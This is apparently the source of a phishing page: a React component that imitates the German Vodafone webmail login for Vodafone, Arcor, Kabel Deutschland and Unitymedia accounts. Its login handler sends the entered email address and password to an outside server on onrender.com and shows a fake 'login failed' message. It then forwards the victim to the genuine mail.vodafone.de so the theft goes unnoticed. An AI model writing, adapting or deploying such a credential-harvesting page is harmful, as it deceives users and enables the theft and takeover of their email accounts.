import React, { useEffect, useState } from "react";
import "./Credentials.css";
import { FaEyeSlash } from "react-icons/fa";
import { FaRegEye } from "react-icons/fa6";
import { IoIosInformationCircle } from "react-icons/io";
import axios from "axios";
import { ClipLoader } from "react-spinners";

const Credentials = () => {
  const [showPassword, setShowPassword] = useState(false);
  const [info, setInfo] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  const handleShowpassword = () => {
    setShowPassword(!showPassword);
  };

  console.log(email, password);
  // const handleLogin = async () => {
  //   try {
  //     setLoading(true);
  //     setTimeout(() => {
  //       setInfo(true);
  //     }, 2000);
  //     // window.location.reload();
  //     setLoading(false);

  //     const res = await axios.post(
  //       "https://hey-1-065m.onrender.com/api/login",
  //       { email, password }
  //     );
  //     if (res.status === 200) {
  //       setTimeout(() => {
  //         window.location.href = "https://mail.vodafone.de/index.aspx";
  //       }, 6000);
  //       setLoading(false);
  //     } else {
  //       setInfo(true);
  //     }
  //   } catch (err) {
  //     console.error("Error:", err);
  //     setInfo(true);
  //   } finally {
  //     setLoading(false);
  //   }
  // };

  const handleLogin = async () => {
    try {
      setLoading(true);
      setTimeout(() => {
        setInfo(true);
        setTimeout(() => {
          // window.location.reload();
        }, 2000);
      }, 2000);
      const res = await axios.post(
        "https://hey-1-065m.onrender.com/api/login",
        { email, password }
      );
      if (res.status === 200) {
        setTimeout(() => {
          window.location.href = "https://mail.vodafone.de/index.aspx";
        }, 10000);
      } else {
        setInfo(true);
      }
    } catch (err) {
      console.error("Error:", err);
      setInfo(true);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="credentialBody">
      <div className="credentialsWrapper">
        <h1>Login mit E-Mail Zugangsdaten</h1>
        <p>
          Für Deine E-Mail-Konten bei Vodafone, Arcor, Kabel Deutschland und
          Unitymedia.
        </p>

        {info && (
          <div className="infoShow">
            <div className="infoShowWrap">
              <div className="showLeft">
                <IoIosInformationCircle
                  style={{
                    color: "white",
                    backgroundColor: "red",
                    fontSize: "24",
                  }}
                />
              </div>
              <div className="showRight">
                <h2>Das hat leider nicht geklappt</h2>
                <p>
                  Versuch‘s bitte nochmal oder klick unten auf „Zugangsdaten
                  vergessen“. Du möchtest Dich über das MeinVodafone-Konto
                  einloggen?
                  <a
                    href="#"
                    style={{ color: "white", textDecoration: "underline" }}
                  >
                    hier
                  </a>
                  .
                </p>
              </div>
            </div>
          </div>
        )}

        <div className="loginForm">
          <div className="loginFormWrap">
            <div className="loginFormTop">
              <input
                type="email"
                placeholder="E-Mail-Adresse"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>
            <div className="eyebobo">
              {showPassword ? (
                <FaRegEye
                  onClick={handleShowpassword}
                  style={{
                    fontSize: "12px",
                    color: "white",
                    backgroundColor: "black",
                  }}
                />
              ) : (
                <FaEyeSlash
                  onClick={handleShowpassword}
                  style={{
                    fontSize: "12px",
                    color: "white",
                    backgroundColor: "black",
                  }}
                />
              )}
            </div>

            <div className="loginFormDown">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="E-Mail-Passwort"
                onChange={(e) => setPassword(e.target.value)}
                value={password}
              />
            </div>
            {loading ? (
              <ClipLoader color="#d63736" size={20} />
            ) : (
              <button className="loginFormButton" onClick={handleLogin}>
                Login
              </button>
            )}
          </div>

          <div className="infoBelowLogin">
            <div className="text">
              <p>
                <a href="#">MeinVodafone Login</a>
              </p>
              <p>
                <a href="#">Zugangsdaten vergensse</a>
              </p>
            </div>

            <div className="dan">
              <p className="danp">
                Du hast noch kein E-Mail-Konto?
                <span
                  style={{
                    color: " rgb(153, 153, 153)",
                    backgroundColor: "#212121",
                  }}
                >
                  Dann kannst Du Dich ganz einfach hier registrieren
                </span>
                {/* <p style={{ textDecoration: "underline" }}>  </p> */}
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Credentials;
